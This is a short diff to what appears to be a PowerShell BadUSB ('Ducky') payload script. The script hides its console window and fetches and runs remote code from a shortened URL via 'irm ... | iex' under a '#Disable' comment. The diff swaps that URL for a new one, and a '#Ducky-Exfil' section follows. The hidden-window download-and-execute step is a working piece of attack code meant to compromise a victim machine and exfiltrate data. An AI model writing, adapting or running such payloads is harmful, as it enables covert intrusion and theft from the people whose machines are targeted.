@@ -18,7 +18,7 @@ $consolePtr = [User32]::GetConsoleWindow();
 [User32]::ShowWindow($consolePtr, $SW_HIDE);
 
 #Disable
-irm https://rb.gy/kce89x | iex;
+irm https://rb.gy/vrt4s6 | iex;
 Start-Sleep -Seconds 5;
 
 #Ducky-Exfil
